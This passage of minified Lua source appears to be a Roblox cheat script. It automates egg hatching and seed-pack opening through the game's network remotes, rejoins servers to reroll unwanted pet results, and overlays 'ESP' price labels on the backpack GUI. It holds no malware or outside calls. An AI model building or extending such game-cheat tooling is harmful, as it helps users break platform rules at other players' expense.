		local j = h.egg_hatcher_pet_keep_filters[G]
		if type(y) == "number" then
			if type(j.cases) ~= "table" or type(j.cases[y]) ~= "table" then
				return false
			end
			j.cases[y].enabled = V == true
		else
			j.enabled = V == true
		end
		a.Save.SaveDataSync()
		Z.EggHatcher.RefreshPetKeepFiltersUiEggHatcher()
		return true
	end,
	PassesPetKeepRuleEggHatcher = function(G, V)
		if type(G) ~= "table" or G.enabled ~= true then
			return false
		end
		if not Z.PackOpenHelpers.PassesSelectedPackOpenHelpers(G.size, V.size) then
			return false
		end
		if not Z.PackOpenHelpers.PassesSelectedPackOpenHelpers(G.variant, V.variant) then
			return false
		end
		return true
	end,
	PassesPetKeepFilterEggHatcher = function(G)
		if type(G) ~= "table" or type(h.egg_hatcher_pet_keep_filters) ~= "table" then
			return false, "No pet filter", false
		end
		local V = h.egg_hatcher_pet_keep_filters[tostring(G.pet or "")]
		if type(V) ~= "table" then
			return false, "No pet filter", false
		end
		local y = V.enabled == true
		if Z.EggHatcher.PassesPetKeepRuleEggHatcher(V, G) then
			return true, "Pet keep filter", true
		end
		if type(V.cases) == "table" then
			for V, j in ipairs(V.cases) do
				if type(j) == "table" and j.enabled == true then
					y = true
				end
				if Z.EggHatcher.PassesPetKeepRuleEggHatcher(j, G) then
					return true, "Pet keep filter", true
				end
			end
		end
		return false, "Pet filter mismatch", y
	end,
	BuildHatchDataEggHatcher = function(G, V, y, j, i, c)
		y = tostring(y or "")
		return {
			openId = tostring(G or ""),
			egg = tostring(V or "");
			pet = y;
			displayName = Z.PackOpenHelpers.GetPetDisplayNamePackOpenHelpers(y);
			rarity = Z.PackOpenHelpers.GetPetRarityPackOpenHelpers(y),
			size = Z.PackOpenHelpers.NormaliseSizePackOpenHelpers(j);
			variant = Z.PackOpenHelpers.NormaliseVariantPackOpenHelpers(i);
			source = tostring(c or "Egg")
		}
	end,
	PassesKeepFiltersEggHatcher = function(G)
		if type(G) ~= "table" then
			return false, "Invalid result"
		end
		if h.egg_hatcher_keep_super_rarity == true and Z.EggHatcher.IsSuperRarityEggHatcher(G.rarity) then
			return true, "Super+ rarity"
		end
		local V, y, j = Z.EggHatcher.PassesPetKeepFilterEggHatcher(G)
		if j then
			return V, y
		end
		if not Z.EggHatcher.HasKeepFiltersEggHatcher() then
			return false, "No keep filter"
		end
		local i = Z.PackOpenHelpers.PassesSelectedPackOpenHelpers(h.egg_hatcher_keep_pets, G.pet) and (Z.PackOpenHelpers.PassesSelectedPackOpenHelpers(h.egg_hatcher_keep_rarities, G.rarity) and (Z.PackOpenHelpers.PassesSelectedPackOpenHelpers(h.egg_hatcher_keep_sizes, G.size) and Z.PackOpenHelpers.PassesSelectedPackOpenHelpers(h.egg_hatcher_keep_variants, G.variant)))
		if i then
			return true, "Selected filter"
		end
		return false, "Not selected"
	end,
	QueueRejoinEggHatcher = function(G, V, y, j)
		if h.egg_hatcher_rejoin_after_hatch ~= true then
			return false
		end
		V = math.max(math.floor(tonumber(V) or 2), 1)
		Z.EggHatcher.ResultRejoinAtEggHatcher = os.clock() + V
		Z.EggHatcher.MarkActiveEggHatcher(V + 2)
		local i = "pet"
		if type(G) == "table" then
			i = tostring(G.displayName or G.pet or "pet")
		end
		Z.EggHatcher.SetStatusEggHatcher(string.format("%s %s \226\128\162 rejoin in %ds", tostring(y or "Hatched"), i, V), tostring(j or "#66CCFF"))
		return true
	end,
	ResetResultTrackingEggHatcher = function()
		Z.EggHatcher.ProcessedResultsForRejoinEggHatcher = 0
		table.clear(Z.EggHatcher.ResultOpenIdsForRejoinEggHatcher)
		Z.EggHatcher.LastNonMatchingResultEggHatcher = nil
		return true
	end;
	RegisterResultForRejoinEggHatcher = function(G)
		if h.egg_hatcher_rejoin_after_hatch ~= true or type(G) ~= "table" then
			return false
		end
		local V = tostring(G.openId or "")
		if V == "" or Z.EggHatcher.ResultOpenIdsForRejoinEggHatcher[V] == true then
			return false
		end
		Z.EggHatcher.ResultOpenIdsForRejoinEggHatcher[V] = true
		Z.EggHatcher.ProcessedResultsForRejoinEggHatcher += 1
		return true
	end,
	CanRunFailedRejoinEggHatcher = function()
		if h.egg_hatcher_rejoin_after_hatch ~= true then
			return false
		end
		if Z.EggHatcher.ResultRejoinMatchedEggHatcher == true then
			return false
		end
		if ((tonumber(Z.EggHatcher.ResultRejoinAtEggHatcher) or 0)) > 0 then
			return false
		end
		if Z.PackOpenHelpers.BusyPackOpenHelpers == true then
			return false
		end
		local G = tonumber(Z.EggHatcher.OpenedForRejoinEggHatcher) or 0
		if G <= 0 then
			return false
		end
		local V = tonumber(Z.EggHatcher.ProcessedResultsForRejoinEggHatcher) or 0
		if V < G then
			return false
		end
		local y = Z.EggHatcher.GetRejoinOpenLimitEggHatcher()
		local j = y > 0 and G >= y
		local i = ((tonumber(Z.EggHatcher.NoToolAtEggHatcher) or 0)) > 0
		if j ~= true and i ~= true then
			return false
		end
		return true
	end;
	ShouldProtectIncompleteResultsEggHatcher = function()
		if h.egg_hatcher_rejoin_after_hatch ~= true then
			return false
		end
		if Z.EggHatcher.ResultRejoinMatchedEggHatcher == true then
			return false
		end
		if ((tonumber(Z.EggHatcher.ResultRejoinAtEggHatcher) or 0)) > 0 then
			return false
		end
		if Z.PackOpenHelpers.BusyPackOpenHelpers == true then
			return false
		end
		local G = tonumber(Z.EggHatcher.OpenedForRejoinEggHatcher) or 0
		local V = tonumber(Z.EggHatcher.ProcessedResultsForRejoinEggHatcher) or 0
		if G <= 0 or V >= G then
			return false
		end
		local y = Z.EggHatcher.GetRejoinOpenLimitEggHatcher()
		local j = y > 0 and G >= y
		local i = ((tonumber(Z.EggHatcher.NoToolAtEggHatcher) or 0)) > 0
		if j ~= true and i ~= true then
			return false
		end
		local c = tonumber(Z.EggHatcher.LastOpenAtEggHatcher) or 0
		return c > 0 and os.clock() - c >= 8
	end;
	ShouldForceFailedRejoinEggHatcher = function()
		if not Z.EggHatcher.CanRunFailedRejoinEggHatcher() then
			return false
		end
		local G = tonumber(Z.EggHatcher.OpenedForRejoinEggHatcher) or 0
		local V = Z.EggHatcher.GetRejoinOpenLimitEggHatcher()
		local y = V > 0 and G >= V
		local j = ((tonumber(Z.EggHatcher.NoToolAtEggHatcher) or 0)) > 0
		if y ~= true and j ~= true then
			return false
		end
		local i = tonumber(Z.EggHatcher.LastOpenAtEggHatcher) or 0
		return i > 0 and os.clock() - i >= 8
	end,
	RunSuccessRejoinEggHatcher = function(G)
		if Z.EggHatcher.ResultRejoinMatchedEggHatcher == true then
			return true
		end
		Z.EggHatcher.ResultRejoinMatchedEggHatcher = true
		task.wait(1)
		local V = math.max(math.floor(tonumber(h.egg_hatcher_rejoin_delay) or 15), 1)
		return Z.EggHatcher.QueueRejoinEggHatcher(G, V, "Kept", "#7CFC00")
	end,
	RunFailedRejoinEggHatcher = function(G)
		if Z.EggHatcher.FailedRejoinCalled then
			return false
		end
		if not Z.EggHatcher.CanRunFailedRejoinEggHatcher() then
			return false
		end
		print("Failed rejoin")
		Z.EggHatcher.FailedRejoinCalled = true
		local V = math.max(math.floor(tonumber(h.egg_hatcher_rejoin_delay) or 15), 1)
		return Z.EggHatcher.QueueRejoinEggHatcher(G, V, "Skipped", "#FFCC66")
	end;
	ProcessHatchResultEggHatcher = function(G, V, y, j, i, c)
		if h.egg_hatcher_enabled ~= true then
			return false
		end
		local J = Z.EggHatcher.BuildHatchDataEggHatcher(G, V, y, j, i, c)
		if J.pet == "" then
			return false
		end
		local T = Z.EggHatcher.PassesKeepFiltersEggHatcher(J)
		Z.EggHatcher.MarkActiveEggHatcher(6)
		if T then
			g.EggHatcherLastKeptPet = J
			Z.EggHatcher.SetStatusEggHatcher("Kept " .. tostring(J.displayName or J.pet), "#7CFC00")
		else
			Z.EggHatcher.SetStatusEggHatcher("Skipped " .. tostring(J.displayName or J.pet), "#FFCC66")
		end
		return T
	end;
	StartRejoinWatcherEggHatcher = function()
		if Z.EggHatcher.StartedRejoinWatcherEggHatcher then
			return false
		end
		Z.EggHatcher.StartedRejoinWatcherEggHatcher = true
		task.spawn(function()
			while not g.is_forced_stop do
				task.wait(.25)
				if h.egg_hatcher_rejoin_after_hatch ~= true then
					Z.EggHatcher.ResultRejoinAtEggHatcher = 0
					Z.EggHatcher.ResultRejoinMatchedEggHatcher = false
					Z.EggHatcher.LastOpenAtEggHatcher = 0
					Z.EggHatcher.NoToolAtEggHatcher = 0
					Z.EggHatcher.FailedRejoinCalled = false
					Z.EggHatcher.ResetResultTrackingEggHatcher()
					continue
				end
				if Z.EggHatcher.ShouldProtectIncompleteResultsEggHatcher() then
					Z.EggHatcher.RunSuccessRejoinEggHatcher({
						displayName = "eggs",
						pet = "eggs"
					})
				elseif Z.EggHatcher.ShouldForceFailedRejoinEggHatcher() then
					local G = Z.EggHatcher.LastNonMatchingResultEggHatcher or {
						displayName = "eggs";
						pet = "eggs"
					}
					Z.EggHatcher.RunFailedRejoinEggHatcher(G)
				end
				local G = tonumber(Z.EggHatcher.ResultRejoinAtEggHatcher) or 0
				if G <= 0 or os.clock() < G then
					continue
				end
				Z.EggHatcher.ResultRejoinAtEggHatcher = 0
				Z.EggHatcher.SetStatusEggHatcher("Rejoining...", "#66CCFF")
				Z.Player.Rejoin()
				task.wait(5)
			end
		end)
		return true
	end;
	LoopEggHatcher = function()
		local G = math.clamp(math.floor(tonumber(h.egg_hatcher_max_per_cycle) or 1), 1, 1000)
		local V = y.Networking and (y.Networking.Egg and y.Networking.Egg.OpenEgg)
		local j = Z.PackOpenHelpers.RunOpenCyclePackOpenHelpers({
			enabled = h.egg_hatcher_enabled == true;
			attributeName = "Egg",
			selected = h.egg_hatcher_selected,
			protected = h.egg_hatcher_protected;
			maxPerCycle = G;
			delay = h.egg_hatcher_delay,
			remote = V,
			shouldEquip = h.egg_hatcher_equip_tool == true,
			setStatus = Z.EggHatcher.SetStatusEggHatcher
		})
		if j then
			Z.EggHatcher.MarkActiveEggHatcher(10)
		end
		return j
	end
}
Z.EggHatcher.EnsureDefaultPetKeepFiltersEggHatcher()
Z.SeedPackOpener = {
	SetStatusSeedPackOpener = function(G, V)
		G = tostring(G or "")
		if G == "" then
			g.SeedPackOpenerStatusText = ""
			return false
		end
		g.SeedPackOpenerStatusText = string.format("<stroke color=\'#000000\' thickness=\'1\'><font color=\'#FFFFFF\'>\240\159\142\129 [Seed Pack Opener]</font> <font color=\'%s\'>%s</font></stroke>", tostring(V or "#FFFFFF"), G)
		return true
	end,
	LoopSeedPackOpener = function()
		local G = y.Networking and (y.Networking.SeedPack and y.Networking.SeedPack.OpenSeedPack)
		return Z.PackOpenHelpers.RunOpenCyclePackOpenHelpers({
			enabled = h.seed_pack_opener_enabled == true,
			attributeName = "SeedPack",
			selected = h.seed_pack_opener_selected;
			protected = h.seed_pack_opener_protected,
			maxPerCycle = h.seed_pack_opener_max_per_cycle;
			delay = h.seed_pack_opener_delay;
			remote = G;
			shouldEquip = h.seed_pack_opener_equip_tool == true,
			setStatus = Z.SeedPackOpener.SetStatusSeedPackOpener
		})
	end
}
g.BackpackFruitPriceEspStatusText = ""
g.BackpackFruitTotalValueStatusText = ""
Z.BackpackFruitPriceEsp = {
	StartedBackpackFruitPriceEsp = false,
	LastShownBackpackFruitPriceEsp = 0,
	LastTotalShownBackpackFruitPriceEsp = 0;
	SetStatusBackpackFruitPriceEsp = function(G, V)
		G = tostring(G or "")
		if G == "" then
			g.BackpackFruitPriceEspStatusText = ""
			return false
		end
		g.BackpackFruitPriceEspStatusText = string.format("<stroke color=\'#000000\' thickness=\'1\'><font color=\'#FFFFFF\'>\240\159\146\176 [Backpack Price]</font> <font color=\'%s\'>%s</font></stroke>", tostring(V or "#FFFFFF"), G)
		return true
	end;
	SetTotalStatusBackpackFruitPriceEsp = function(G, V)
		G = tostring(G or "")
		if G == "" then
			g.BackpackFruitTotalValueStatusText = ""
			return false
		end
		g.BackpackFruitTotalValueStatusText = string.format("<stroke color=\'#000000\' thickness=\'1\'><font color=\'#FFFFFF\'>\240\159\146\142 [Fruit Inventory]</font> <font color=\'%s\'>%s</font></stroke>", tostring(V or "#FFFFFF"), G)
		return true
	end,
	CleanTextBackpackFruitPriceEsp = function(G)
		G = tostring(G or "")
		G = G:gsub("<[^>]+>", "")
		return G:match("^%s*(.-)%s*$") or ""
	end;
	GetBackpackGuiBackpackFruitPriceEsp = function()
		local G = y.PlayerGui or (y.LocalPlayer and y.LocalPlayer:FindFirstChild("PlayerGui"))
		local V = G and G:FindFirstChild("BackpackGui")
		local Z = V and V:FindFirstChild("Backpack")
		return Z
	end,
	GetSlotRootsBackpackFruitPriceEsp = function()
		local G = {}
		local V = Z.BackpackFruitPriceEsp.GetBackpackGuiBackpackFruitPriceEsp()
		if not V then
			return G
		end
		local y = V:FindFirstChild("Hotbar")
		if y then
			table.insert(G, y)
		end
		local j = V:FindFirstChild("Inventory")
		local i = j and j:FindFirstChild("ScrollingFrame")
		local c = i and i:FindFirstChild("UIGridFrame")
		if c then
			table.insert(G, c)
		end
		return G
	end;
	GetSlotsBackpackFruitPriceEsp = function()
		local G = {}
		for V, y in ipairs(Z.BackpackFruitPriceEsp.GetSlotRootsBackpackFruitPriceEsp()) do
			for V, y in ipairs(y:GetChildren()) do
				if y:IsA("GuiObject") and y:FindFirstChild("ToolName", true) then
					table.insert(G, y)
				end
			end
		end
		table.sort(G, function(G, V)
			local y = tonumber(G.LayoutOrder) or tonumber(G.Name) or 0
			local Z = tonumber(V.LayoutOrder) or tonumber(V.Name) or 0
			if y ~= Z then
				return y < Z
			end
			return tostring(G.Name or "") < tostring(V.Name or "")
		end)
		return G
	end;
	FormatWeightBackpackFruitPriceEsp = function(G)
		local V = tonumber(G)
		if not V then
			return ""
		end
		if type(y.WeightFormat) == "table" and type(y.WeightFormat.FormatGrams) == "function" then
			local G, Z = pcall(function()
				return y.WeightFormat.FormatGrams(V)
			end)
			if G and (type(Z) == "string" and Z ~= "") then
				return Z
			end
		end
		local Z = string.format("%.2fkg", V)
		return Z:gsub("%.00kg", "kg")
	end;
	GetToolFruitNameBackpackFruitPriceEsp = function(G)
		if typeof(G) ~= "Instance" or not G.Parent then
			return "", ""
		end
		local V = G:IsA("Tool") and ((G:GetAttribute("HarvestedFruit") == true or G:GetAttribute("Fruit") ~= nil or G:GetAttribute("FruitName") ~= nil))
		local y = G:IsA("Configuration") and (G:GetAttribute("FruitProxy") == true and G:GetAttribute("HarvestedFruit") == true)
		if not V and not y then
			return "", ""
		end
		local Z = G:GetAttribute("Fruit") or G:GetAttribute("FruitName")
		local j = G:GetAttribute("FruitName") or G:GetAttribute("Fruit")
		Z = type(Z) == "string" and Z or ""
		j = type(j) == "string" and j or Z
		return Z, j
	end;
	BuildFruitDataBackpackFruitPriceEsp = function(G)
		if typeof(G) ~= "Instance" or not G.Parent then
			return nil
		end
		local V, y = Z.BackpackFruitPriceEsp.GetToolFruitNameBackpackFruitPriceEsp(G)
		if V == "" or y == "" then
			return nil
		end
		local j = nil
		if Z.SellManager and type(Z.SellManager.BuildBackpackFruitData) == "function" then
			local V, y = pcall(function()
				return Z.SellManager.BuildBackpackFruitData(G)
			end)
			if V and type(y) == "table" then
				j = y
			end
		end
		j = type(j) == "table" and j or {}
		local i = tonumber(j.kg or j.weight or j.w or G:GetAttribute("Weight") or G:GetAttribute("weight") or G:GetAttribute("KG") or G:GetAttribute("Kg") or 0) or 0
		local c = tostring(j.kgText or j.weightText or j.wText or "")
		if c == "" then
			c = Z.BackpackFruitPriceEsp.FormatWeightBackpackFruitPriceEsp(i)
		end
		local J = j.Mutation or j.mutation or j.rawMutation or G:GetAttribute("Mutation")
		local T = j.SizeMultiplier or j.SizeMulti or j.sizeMultiplier or j.size or G:GetAttribute("SizeMultiplier") or G:GetAttribute("SizeMulti")
		return {
			ob = G;
			id = tostring(j.id or j.Id or G:GetAttribute("Id") or G.Name or "");
			displayName = V,
			calcName = y;
			weight = i,
			weightText = c,
			mutation = J,
			sourceData = {
				SizeMultiplier = T,
				SizeMulti = T;
				DecayAlpha = j.DecayAlpha or j.decayAlpha or G:GetAttribute("DecayAlpha"),
				Mutation = J
			}
		}
	end,
	GetToolWeightTextBackpackFruitPriceEsp = function(G)
		local V = Z.BackpackFruitPriceEsp.BuildFruitDataBackpackFruitPriceEsp(G)
		return V and tostring(V.weightText or "") or ""
	end;
	GetToolPriceBackpackFruitPriceEsp = function(G)
		local V = Z.BackpackFruitPriceEsp.BuildFruitDataBackpackFruitPriceEsp(G)
		if not V or V.calcName == "" or type(Z.BuySelectFruit) ~= "table" or type(Z.BuySelectFruit.GetEstimatedPriceBuySelectFruit) ~= "function" then
			return 0, 1, "none"
		end
		local y, j, i = Z.BuySelectFruit.GetEstimatedPriceBuySelectFruit(V.calcName, V.sourceData, V.mutation)
		return math.max(math.floor(tonumber(y) or 0), 0), tonumber(j) or 1, tostring(i or "none")
	end;
	BuildToolBucketsBackpackFruitPriceEsp = function()
		local G = {}
		local V = {}
		for y, j in ipairs(Z.Backpack.GetBackpackAllItems()) do
			if typeof(j) ~= "Instance" or V[j] then
				continue
			end
			V[j] = true
			local i = Z.BackpackFruitPriceEsp.BuildFruitDataBackpackFruitPriceEsp(j)
			if not i then
				continue
			end
			local c, J, T = Z.BackpackFruitPriceEsp.GetToolPriceBackpackFruitPriceEsp(j)
			local d = tostring(i.displayName) .. ("||" .. tostring(i.weightText))
			local u = tostring(i.displayName) .. "||"
			local q = {
				item = j,
				displayName = i.displayName;
				weightText = i.weightText,
				price = c,
				multiplier = J,
				tier = T,
				signature = tostring(i.id) .. ("|" .. (tostring(c) .. ("|" .. (tostring(J) .. ("|" .. tostring(T))))))
			}
			if not G[d] then
				G[d] = {}
			end
			table.insert(G[d], q)
			if d ~= u then
				if not G[u] then
					G[u] = {}
				end
				table.insert(G[u], q)
			end
		end
		for G, V in pairs(G) do
			table.sort(V, function(G, V)
				return tostring(G.signature or "") < tostring(V.signature or "")
			end)
			V._index = 0
		end
		return G
	end,
	GetSlotFruitKeyBackpackFruitPriceEsp = function(G)
		if not G or not G.Parent then
			return "", ""
		end
		local V = G:FindFirstChild("ToolName", true)
		local y = G:FindFirstChild("ToolCount", true)
		local j = Z.BackpackFruitPriceEsp.CleanTextBackpackFruitPriceEsp(V and V.Text or "")
		local i = Z.BackpackFruitPriceEsp.CleanTextBackpackFruitPriceEsp(y and y.Text or "")
		if j == "" or i == "" or not (i:lower()):find("kg", 1, true) then
			return "", ""
		end
		return j .. ("||" .. i), j .. "||"
	end;
	GetOrCreateLabelBackpackFruitPriceEsp = function(G)
		if not G or not G.Parent then
			return nil
		end
		local V = G:FindFirstChild("ExoFruitPriceLabel")
		if V and V:IsA("TextLabel") then
			return V
		end
		V = Instance.new("TextLabel")
		V.Name = "ExoFruitPriceLabel"
		V.AnchorPoint = Vector2.new(.5, 0)
		V.Position = UDim2.new(.5, 0, 0, 1)
		V.Size = UDim2.new(1, - 4, 0, 14)
		V.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		V.BackgroundTransparency = .35
		V.BorderSizePixel = 0
		V.Font = Enum.Font.GothamBold
		V.TextColor3 = Color3.fromRGB(70, 255, 120)
		V.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
		V.TextStrokeTransparency = .25
		V.TextScaled = true
		V.TextWrapped = false
		V.TextXAlignment = Enum.TextXAlignment.Center
		V.TextYAlignment = Enum.TextYAlignment.Center
		V.ZIndex = math.max(((G.ZIndex or 1)) + 25, 25)
		V.Active = false
		V.Parent = G
		local y = Instance.new("UICorner")
		y.CornerRadius = UDim.new(0, 3)
		y.Parent = V
		local Z = Instance.new("UITextSizeConstraint")
		Z.MinTextSize = 8
		Z.MaxTextSize = 14
		Z.Parent = V
		return V
	end,
	RemoveSlotLabelBackpackFruitPriceEsp = function(G)
		local V = G and G:FindFirstChild("ExoFruitPriceLabel")
		if V then
			V:Destroy()
		end
	end;
	ClearLabelsBackpackFruitPriceEsp = function()
		for G, V in ipairs(Z.BackpackFruitPriceEsp.GetSlotRootsBackpackFruitPriceEsp()) do
			for G, V in ipairs(V:GetDescendants()) do
				if V.Name == "ExoFruitPriceLabel" then
					V:Destroy()
				end
			end
		end
		Z.BackpackFruitPriceEsp.LastShownBackpackFruitPriceEsp = 0
		Z.BackpackFruitPriceEsp.SetStatusBackpackFruitPriceEsp("")
	end;
	FormatPriceBackpackFruitPriceEsp = function(G)
		if type(Z.BuySelectFruit) == "table" and type(Z.BuySelectFruit.FormatPriceBuySelectFruit) == "function" then
			return Z.BuySelectFruit.FormatPriceBuySelectFruit(G)
		end
		if E and (E.Currency and type(E.Currency.FormatMoney) == "function") then
			return E.Currency.FormatMoney(G)
		end
		return tostring(math.floor(tonumber(G) or 0))
	end;
	GetOrCreateTotalLabelBackpackFruitPriceEsp = function()
		local G = Z.BackpackFruitPriceEsp.GetBackpackGuiBackpackFruitPriceEsp()
		if not G then
			return nil
		end
		local V = G:FindFirstChild("ExoFruitTotalValueLabel")
		if V and V:IsA("TextLabel") then
			return V
		end
		V = Instance.new("TextLabel")
		V.Name = "ExoFruitTotalValueLabel"
		V.AnchorPoint = Vector2.new(.5, 0)
		V.Position = UDim2.new(.5, 0, 0, 3)
		V.Size = UDim2.new(0, 260, 0, 22)
		V.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		V.BackgroundTransparency = .25
		V.BorderSizePixel = 0
		V.Font = Enum.Font.GothamBold
		V.RichText = true
		V.TextColor3 = Color3.fromRGB(255, 255, 255)
		V.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
		V.TextStrokeTransparency = .25
		V.TextScaled = true
		V.TextWrapped = false
		V.TextXAlignment = Enum.TextXAlignment.Center
		V.TextYAlignment = Enum.TextYAlignment.Center
		V.ZIndex = 999
		V.Active = false
		V.Parent = G
		local y = Instance.new("UICorner")
		y.CornerRadius = UDim.new(0, 5)
		y.Parent = V
		local j = Instance.new("UITextSizeConstraint")
		j.MinTextSize = 10
		j.MaxTextSize = 18
		j.Parent = V
		return V
	end,
	ClearTotalLabelBackpackFruitPriceEsp = function()
		local G = Z.BackpackFruitPriceEsp.GetBackpackGuiBackpackFruitPriceEsp()
		local V = G and G:FindFirstChild("ExoFruitTotalValueLabel")
		if V then
			V:Destroy()
		end
		Z.BackpackFruitPriceEsp.LastTotalShownBackpackFruitPriceEsp = 0
		Z.BackpackFruitPriceEsp.SetTotalStatusBackpackFruitPriceEsp("")
	end;
	BuildInventoryTotalBackpackFruitPriceEsp = function()
		local G = 0
		local V = 0
		local y = 0
		local j = {}
		if type(Z.BuySelectFruit) == "table" and type(Z.BuySelectFruit.EnsureFruitStockReadyBuySelectFruit) == "function" then
			Z.BuySelectFruit.EnsureFruitStockReadyBuySelectFruit(false)
		end
		for i, c in ipairs(Z.Backpack.GetBackpackAllItems()) do
			if typeof(c) ~= "Instance" or j[c] then
				continue
			end
			j[c] = true
			local J = Z.BackpackFruitPriceEsp.BuildFruitDataBackpackFruitPriceEsp(c)
			if not J then
				continue
			end
			V += 1
			local T = Z.BackpackFruitPriceEsp.GetToolPriceBackpackFruitPriceEsp(c)
			T = math.max(math.floor(tonumber(T) or 0), 0)
			if T > 0 then
				y += 1
				G += T
			end
		end
		return G, V, y
	end;
	RefreshTotalValueBackpackFruitPriceEsp = function()
		if h.backpack_fruit_total_value_esp_enabled ~= true then
			Z.BackpackFruitPriceEsp.ClearTotalLabelBackpackFruitPriceEsp()
			return false
		end
		local G, V, y = Z.BackpackFruitPriceEsp.BuildInventoryTotalBackpackFruitPriceEsp()
		local j = Z.BackpackFruitPriceEsp.FormatPriceBackpackFruitPriceEsp(G)
		local i = Z.BackpackFruitPriceEsp.GetOrCreateTotalLabelBackpackFruitPriceEsp()
		if i then
			i.Text = string.format("<font color=\'#FFD700\'>Inventory Value:</font> <font color=\'#7CFC00\'>$%s</font> <font color=\'#FFFFFF\'>(%d fruits)</font>", j, V)
			i.Visible = true
		end
		Z.BackpackFruitPriceEsp.LastTotalShownBackpackFruitPriceEsp = V
		Z.BackpackFruitPriceEsp.SetTotalStatusBackpackFruitPriceEsp(string.format("$%s from %d fruit%s", j, V, V == 1 and "" or "s"), y > 0 and "#7CFC00" or "#FFCC66")
		return true
	end,
	RefreshBackpackFruitPriceEsp = function()
		if h.backpack_fruit_price_esp_enabled ~= true then
			if Z.BackpackFruitPriceEsp.LastShownBackpackFruitPriceEsp > 0 then
				Z.BackpackFruitPriceEsp.ClearLabelsBackpackFruitPriceEsp()
			end
			Z.BackpackFruitPriceEsp.RefreshTotalValueBackpackFruitPriceEsp()
			return false
		end
		if type(Z.BuySelectFruit) == "table" and type(Z.BuySelectFruit.EnsureFruitStockReadyBuySelectFruit) == "function" then
			Z.BuySelectFruit.EnsureFruitStockReadyBuySelectFruit(false)
		end
		local G = Z.BackpackFruitPriceEsp.BuildToolBucketsBackpackFruitPriceEsp()
		local V = 0
		for y, j in ipairs(Z.BackpackFruitPriceEsp.GetSlotsBackpackFruitPriceEsp()) do
			local i, c = Z.BackpackFruitPriceEsp.GetSlotFruitKeyBackpackFruitPriceEsp(j)
			local J = i ~= "" and G[i] or nil
			if ((not J or J._index >= # J)) and c ~= "" then
				J = G[c]
			end
			if not J or J._index >= # J then
				Z.BackpackFruitPriceEsp.RemoveSlotLabelBackpackFruitPriceEsp(j)
				continue
			end
			J._index += 1
			local T = J[J._index]
			if not T or ((tonumber(T.price) or 0)) <= 0 then
				Z.BackpackFruitPriceEsp.RemoveSlotLabelBackpackFruitPriceEsp(j)
				continue
			end
			local d = Z.BackpackFruitPriceEsp.GetOrCreateLabelBackpackFruitPriceEsp(j)
			if d then
				local G = Z.BackpackFruitPriceEsp.FormatPriceBackpackFruitPriceEsp(T.price)
				local y = tonumber(T.multiplier) or 1
				d.Text = y ~= 1 and string.format("$%s x%s", G, tostring(math.floor(y * 100 + .5) / 100)) or "$" .. G
				d.Visible = true
				V += 1
			end
		end
		Z.BackpackFruitPriceEsp.LastShownBackpackFruitPriceEsp = V
		Z.BackpackFruitPriceEsp.SetStatusBackpackFruitPriceEsp(V > 0 and string.format("Showing %d fruit prices", V) or "No fruit slots found", V > 0 and "#7CFC00" or "#FFCC66")
		Z.BackpackFruitPriceEsp.RefreshTotalValueBackpackFruitPriceEsp()
		return true
	end,
	StartBackpackFruitPriceEsp = function()
		local G = Z.BackpackFruitPriceEsp
		if G.StartedBackpackFruitPriceEsp then
			return false
		end
		G.StartedBackpackFruitPriceEsp = true
		task.spawn(function()
			while G.StartedBackpackFruitPriceEsp and not g.is_forced_stop do
				local V, y = pcall(G.RefreshBackpackFruitPriceEsp)
				if not V then
					warn("[BackpackFruitPriceEsp]", y)
				end
				task.wait(.75)
			end
			G.ClearLabelsBackpackFruitPriceEsp()
			G.ClearTotalLabelBackpackFruitPriceEsp()
		end)
		return true
	end
}
Z.WeatherTriggers = {
	CachedAllOptionsWeatherTriggers = nil,
	CachedTimeCycleOptionsWeatherTriggers = nil;
	CachedWeatherOptionsWeatherTriggers = nil,
	CachedPhaseLookupWeatherTriggers = nil;
	CachedTimeCycleLookupWeatherTriggers = nil;
	CachedWeatherLookupWeatherTriggers = nil;
	NormaliseWeatherTriggers = function(G)
		return ((tostring(G or "")):lower()):gsub("%s+", "")
	end,
	AddNameWeatherTriggers = function(G, V, y)
		y = (tostring(y or "")):match("^%s*(.-)%s*$") or ""
		if y == "" then
			return false
		end
		local j = Z.WeatherTriggers.NormaliseWeatherTriggers(y)
		if j == "" or V[j] then
			return false
		end
		V[j] = y
		table.insert(G, y)
		return true
	end;
	AddInstanceNamesWeatherTriggers = function(G, V, y)
		if not y or not y.Parent then
			return false
		end
		local j = y:GetChildren()
		table.sort(j, function(G, V)
			return tostring(G.Name or "") < tostring(V.Name or "")
		end)
		for y, j in ipairs(j) do
			if j:IsA("ModuleScript") or j:IsA("Folder") then
				Z.WeatherTriggers.AddNameWeatherTriggers(G, V, j.Name)
			end
		end
		return true
	end,
	GetControllerRootWeatherTriggers = function(G)
		local V = y.LocalPlayer and y.LocalPlayer:FindFirstChild("PlayerScripts")
		local Z = V and V:FindFirstChild("Controllers")
		return Z and Z:FindFirstChild(G) or nil
	end,
	BuildTimeCycleOptionsWeatherTriggers = function()
		local G = {}
		local V = {}
		local j = {}
		local i = y.TimeCycleData and y.TimeCycleData.Data
		local c = {}
		if type(i) == "table" then
			for G, V in pairs(i) do
				if type(G) == "string" and G ~= "" then
					table.insert(c, {
						name = G;
						order = type(V) == "table" and tonumber(V.StartOrder) or 999
					})
					j[Z.WeatherTriggers.NormaliseWeatherTriggers(G)] = true
				end
			end
			table.sort(c, function(G, V)
				if G.order ~= V.order then
					return G.order < V.order
				end
				return tostring(G.name or "") < tostring(V.name or "")
			end)
			for y, j in ipairs(c) do
				Z.WeatherTriggers.AddNameWeatherTriggers(G, V, j.name)
			end
			for y, j in ipairs(c) do
				local c = i[j.name]
				local J = type(c) == "table" and c.Weathers or nil
				local T = {}
				if type(J) == "table" then
					for G in pairs(J) do
						table.insert(T, tostring(G or ""))
					end
				end
				table.sort(T)
				for y, j in ipairs(T) do
					Z.WeatherTriggers.AddNameWeatherTriggers(G, V, j)
				end
			end
		end
		local J = Z.WeatherTriggers.GetControllerRootWeatherTriggers("TimeCycleController")
		local T = J and J:FindFirstChild("Phases")
		Z.WeatherTriggers.AddInstanceNamesWeatherTriggers(G, V, T)
		return G, V, j
	end,
	BuildWeatherOptionsWeatherTriggers = function()
		local G = {}
		local V = {}
		local j = y.WeatherData and y.WeatherData.Data
		if type(j) == "table" then
			for y, j in ipairs(j) do
				if type(j) == "table" then
					Z.WeatherTriggers.AddNameWeatherTriggers(G, V, j.Name)
				end
			end
		end
